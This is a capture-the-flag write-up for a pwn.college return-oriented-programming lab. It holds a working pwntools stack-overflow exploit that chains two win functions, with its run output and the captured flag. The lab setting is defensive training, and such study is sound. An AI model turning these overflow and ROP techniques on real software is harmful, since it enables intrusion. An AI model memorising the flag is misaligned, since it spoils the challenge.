@@ -1,0 +1,101 @@
+1. Read
+hacker@return-oriented-programming-level-2-0:~$ /challenge/babyrop_level2.0 
+###
+### Welcome to /challenge/babyrop_level2.0!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+
+In this challenge, there are 2 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_2`.
+In order to get the flag, you will need to call all of these stages in order.
+
+You can call a function by directly overflowing into the saved return address,
+which is stored at 0x7ffccda6bf78, 120 bytes after the start of your input buffer.
+That means that you will need to input at least 128 bytes (96 to fill the buffer,
+24 to fill other stuff stored between the buffer and the return address,
+and 8 that will overwrite the return address).
+
+Received 1 bytes! This is potentially -15 gadgets.
+Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
+from within this challenge. You will have to do that by yourself.
+
++--- Printing 4294967282 gadgets of ROP chain at 0x7ffccda6bf78.
+
+Leaving!
+### Goodbye!
+
+2. Check the security of the binary file. No canary found so we can just do as the challenge says
+hacker@return-oriented-programming-level-2-0:~$ checksec /challenge/babyrop_level2.0
+[*] '/challenge/babyrop_level2.0'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+
+3. We need to check the address of win_stage_1 and win_stage_2 to solve this. We can check it using readelf
+hacker@return-oriented-programming-level-2-0:~$ readelf -s  /challenge/babyrop_level2.0 | grep win_stage
+    65: 0000000000402649   173 FUNC    GLOBAL DEFAULT   15 win_stage_1
+    90: 00000000004026f6   177 FUNC    GLOBAL DEFAULT   15 win_stage_2
+
+4. Construct the payload
+
+from pwn import *
+
+def construct_payload():
+    win_1 = 0x402649
+    win_2 = 0x4026f6
+
+    # Construct the ROP chain
+    rop_chain = cyclic(120)
+    rop_chain += p64(win_1) 
+    rop_chain += p64(win_2) 
+
+    return rop_chain
+
+
+payload = construct_payload()
+print("payload: ", end="")
+print(payload)
+
+p = process("/challenge/babyrop_level2.0")
+p.send(payload)
+
+output = p.recvall()
+print(output.decode())
+p.close()
+
+4. Run it
+
+hacker@return-oriented-programming-level-2-0:~$ /bin/python /home/hacker/Documents/2.py
+payload: b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabI&@\x00\x00\x00\x00\x00\xf6&@\x00\x00\x00\x00\x00'
+[+] Starting local process '/challenge/babyrop_level2.0': pid 2779
+[+] Receiving all data: Done (1.82KB)
+[*] Process '/challenge/babyrop_level2.0' stopped with exit code -11 (SIGSEGV) (pid 2779)
+###
+### Welcome to /challenge/babyrop_level2.0!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+
+In this challenge, there are 2 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_2`.
+In order to get the flag, you will need to call all of these stages in order.
+
+You can call a function by directly overflowing into the saved return address,
+which is stored at 0x7ffe052225b8, 120 bytes after the start of your input buffer.
+That means that you will need to input at least 128 bytes (96 to fill the buffer,
+24 to fill other stuff stored between the buffer and the return address,
+and 8 that will overwrite the return address).
+Received 136 bytes! This is potentially 2 gadgets.
+Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
+from within this challenge. You will have to do that by yourself.
+
++--- Printing 3 gadgets of ROP chain at 0x7ffe052225b8.
+| 0x0000000000402649: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; mov esi, 0 ; lea rdi, [rip + 0xb2e] ; mov eax, 0 ; call 0x401210 ; 
+| 0x00000000004026f6: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; mov esi, 0 ; lea rdi, [rip + 0xa81] ; mov eax, 0 ; call 0x401210 ; 
+| 0x00007ffe052226e8: cmp dh, byte ptr [rsi] ; and al, byte ptr [rip + 0x7ffe] ; and al, byte ptr ss:[rip + 0x7ffe] ; push 0x36 ; and al, byte ptr [rip + 0x7ffe] ; cdq  ; and al, byte ptr ss:[rip + 0x7ffe] ; fdiv dword ptr [rsi] ; and al, byte ptr [rip + 0x7ffe] ; jmp 0x7ffe0327494b ; jg 0x7ffe05222717 ; add byte ptr [rdi], bl ; 
+
+Leaving!
+pwn.college{0W0NieaNjYKzf80zgMDmcYFcn6o.01M0MDL2kDNzMzW}
